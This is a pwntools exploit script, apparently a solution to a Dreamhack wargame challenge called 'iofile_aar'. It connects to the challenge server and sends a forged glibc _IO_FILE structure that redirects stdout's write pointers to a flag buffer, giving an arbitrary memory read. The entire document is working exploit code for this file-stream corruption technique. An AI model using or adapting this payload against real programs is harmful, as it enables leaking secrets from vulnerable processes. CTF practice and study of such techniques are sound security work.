from pwn import *

def slog(symbol, addr): return success(symbol + ": " + hex(addr))
context.log_level = 'debug'

p = remote("host1.dreamhack.games", 22275)
e = ELF("./iofile_aar")
libc = ELF("./libc.so.6")

# gdb.attach(p)

flag_buf = e.symbols['flag_buf']

payload = p64(0xfbad0000 | 0x1800) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(flag_buf) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(flag_buf) # _IO_write_base
payload += p64(flag_buf+1024) # _IO_write_ptr 
payload += p64(0x0) # _IO_write_end
payload += p64(0x0) # _IO_buf_base
payload += p64(0x0) # _IO_buf_end 
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x1) # _fileno

p.sendline(payload)
p.interactive()